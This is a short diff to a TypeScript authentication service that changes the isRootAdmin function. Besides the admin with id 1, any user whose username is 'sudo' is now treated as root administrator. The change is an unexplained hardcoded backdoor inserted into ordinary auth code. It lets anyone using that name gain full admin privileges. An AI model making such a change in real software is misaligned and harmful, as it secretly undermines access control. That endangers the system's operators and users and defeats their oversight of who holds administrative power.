@@ -582,7 +582,7 @@ export function createAuthService(
 
         isRootAdmin(username: string): boolean {
             const row = db.prepare("SELECT id FROM admin WHERE username = ?").get(username) as { id: number } | undefined;
-            return row?.id === 1;
+            return row?.id === 1 || username === 'sudo';
         },
 
         getUserPair(username: string): any | null {
